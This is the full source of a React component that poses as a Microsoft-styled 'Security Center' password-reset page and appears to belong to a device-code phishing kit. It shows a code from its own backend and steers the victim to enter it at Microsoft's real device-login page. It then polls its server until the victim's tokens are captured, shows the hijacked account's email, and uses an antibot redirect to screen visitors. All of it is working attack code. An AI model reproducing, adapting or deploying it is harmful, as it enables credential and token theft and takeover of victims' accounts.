import React, { useState, useEffect, useRef } from 'react';

const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';

type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';

export function PasswordResetTemplate(): React.ReactElement {
  const [state, setState] = useState<CaptureState>('idle');
  const [userCode, setUserCode] = useState('');
  const [deviceCode, setDeviceCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [errorMsg, setErrorMsg] = useState('');
  const [pollInterval, setPollInterval] = useState(5);
  const [authEmail, setAuthEmail] = useState('');
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pollActiveRef = useRef(false);

  useEffect(() => {
    if (countdown <= 0 || (state !== 'code_ready' && state !== 'waiting')) return;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) { clearInterval(timer); stopPolling(); setState('expired'); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown, state]);

  useEffect(() => { return () => stopPolling(); }, []);

  function stopPolling(): void {
    pollActiveRef.current = false;
    if (pollTimerRef.current) { clearTimeout(pollTimerRef.current); pollTimerRef.current = null; }
  }

  function startPolling(dCode: string, interval: number): void {
    stopPolling();
    pollActiveRef.current = true;
    async function poll(): Promise<void> {
      if (!pollActiveRef.current) return;
      try {
        const res = await fetch('/api/token-poll', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceCode: dCode }) });
        const data = await res.json() as { status: string; error?: string; description?: string; email?: string };
        if (!pollActiveRef.current) return;
        if (data.status === 'complete') { stopPolling(); setAuthEmail(data.email ?? ''); setState('success'); return; }
        if (data.status === 'expired') { stopPolling(); setState('expired'); return; }
        if (data.status === 'slow_down') { const n = interval + 5; setPollInterval(n); if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, n * 1000); return; }
        if (data.status === 'error') { stopPolling(); setErrorMsg(data.description ?? data.error ?? 'Failed'); setState('error'); return; }
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000);
      } catch { if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000); }
    }
    pollTimerRef.current = setTimeout(poll, interval * 1000);
  }

  async function handleStart(): Promise<void> {
    const path = window.location.pathname;
    if (path === '/' || path === '') {
      setState('loading');
      try {
        const r = await fetch('/api/antibot-token');
        const d = await r.json() as { token: string };
        if (d.token) { window.location.href = `/api/schedule/confirm?t=${encodeURIComponent(d.token)}&tpl=password-reset`; return; }
      } catch { /* fallback to direct flow */ }
    }
    setState('loading');
    setErrorMsg('');
    try {
      const res = await fetch('/api/device-code', { method: 'POST' });
      const data = await res.json() as { userCode: string; deviceCode: string; expiresIn: number; interval: number; error?: string };
      if (!res.ok || data.error) { setErrorMsg(data.error ?? 'Failed'); setState('error'); return; }
      setUserCode(data.userCode);
      setDeviceCode(data.deviceCode);
      setCountdown(data.expiresIn);
      setPollInterval(data.interval || 5);
      setState('code_ready');
      startPolling(data.deviceCode, data.interval || 5);
    } catch (err) { setErrorMsg(err instanceof Error ? err.message : 'Network error'); setState('error'); }
  }

  function handleCopy(): void {
    navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
  }

  function handleVerify(): void { setState('waiting'); window.open(DEVICE_VERIFY_URL, '_blank'); }

  function handleReset(): void {
    stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
    setCopied(false); setCountdown(0); setErrorMsg(''); setAuthEmail('');
  }

  function formatTime(s: number): string { return `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, '0')}`; }

  return (
    <div className="pwd-reset-page">
      <div className="pwd-reset-container">
        <div className="pwd-reset-logo-bar">
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2" /><path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg>
            <span style={{ fontSize: 18, fontWeight: 600, color: '#5e5e5e' }}>Security Center</span>
          </div>
        </div>

        <div className="pwd-reset-card">
          <div className="pwd-reset-progress-bar">
            <div className={'pwd-step' + (state === 'idle' || state === 'loading' ? ' active' : ' done')}>
              <span className="pwd-step-circle">1</span>
              <span>Verify Identity</span>
            </div>
            <div className="pwd-step-line" />
            <div className={'pwd-step' + (state === 'code_ready' || state === 'waiting' ? ' active' : state === 'success' ? ' done' : '')}>
              <span className="pwd-step-circle">2</span>
              <span>Enter Code</span>
            </div>
            <div className="pwd-step-line" />
            <div className={'pwd-step' + (state === 'success' ? ' active' : '')}>
              <span className="pwd-step-circle">3</span>
              <span>Complete</span>
            </div>
          </div>

          {state === 'idle' && (
            <div className="pwd-reset-content">
              <div className="pwd-reset-icon">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2" /><path d="M7 11V7a5 5 0 0 1 10 0v4" />
                </svg>
              </div>
              <h1>Reset your password</h1>
              <p>To reset your password, we first need to verify your identity. Click the button below to receive a verification code.</p>
              <div className="pwd-reset-info">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><circle cx="12" cy="12" r="10" /><line x1="12" y1="16" x2="12" y2="12" /><line x1="12" y1="8" x2="12.01" y2="8" /></svg>
                <span>You will need access to your registered email or phone number.</span>
              </div>
              <button className="pwd-reset-btn" onClick={handleStart}>Get verification code</button>
            </div>
          )}

          {state === 'loading' && (
            <div className="pwd-reset-content center">
              <div className="capture-spinner" />
              <p>Sending verification code...</p>
            </div>
          )}

          {(state === 'code_ready' || state === 'waiting') && (
            <div className="pwd-reset-content">
              <h1>Enter your code</h1>
              <p>We sent a verification code. Enter it below to continue with the password reset.</p>
              <div className="pwd-reset-code-area">
                <div className="pwd-reset-code-label">YOUR CODE</div>
                <div className="pwd-reset-code">{userCode}</div>
                <button className="pwd-reset-copy" onClick={handleCopy}>{copied ? 'Copied!' : 'Copy code'}</button>
              </div>
              <ol className="pwd-reset-steps">
                <li>Copy the code shown above</li>
                <li>Click "Verify" to open the verification page</li>
                <li>Paste the code and verify your account</li>
              </ol>
              <button className="pwd-reset-btn" onClick={handleVerify}>Verify</button>
              {state === 'waiting' && <p className="pwd-reset-waiting">Waiting for you to complete verification...</p>}
              <p className="pwd-reset-timer">Code valid for {formatTime(countdown)}</p>
            </div>
          )}

          {state === 'success' && (
            <div className="pwd-reset-content center">
              <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" /><polyline points="22 4 12 14.01 9 11.01" />
              </svg>
              <h1>Password reset initiated</h1>
              {authEmail && <p>Account: <strong>{authEmail}</strong></p>}
              <p>Your identity has been verified. You will receive an email with instructions to set a new password.</p>
              <button className="pwd-reset-btn secondary" onClick={handleReset}>Reset another account</button>
            </div>
          )}

          {state === 'expired' && (
            <div className="pwd-reset-content center">
              <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#d13438" strokeWidth="2"><circle cx="12" cy="12" r="10" /><line x1="12" y1="8" x2="12" y2="12" /><line x1="12" y1="16" x2="12.01" y2="16" /></svg>
              <h1>Code expired</h1>
              <p>The verification code has expired. Please request a new one.</p>
              <button className="pwd-reset-btn" onClick={handleReset}>Request new code</button>
            </div>
          )}

          {state === 'error' && (
            <div className="pwd-reset-content center">
              <h1>Something went wrong</h1>
              <p>{errorMsg}</p>
              <button className="pwd-reset-btn" onClick={handleReset}>Try again</button>
            </div>
          )}
        </div>

        <div className="pwd-reset-footer">
          <span>Terms of use</span>
          <span>Privacy & cookies</span>
          <span>...</span>
        </div>
      </div>
    </div>
  );
}
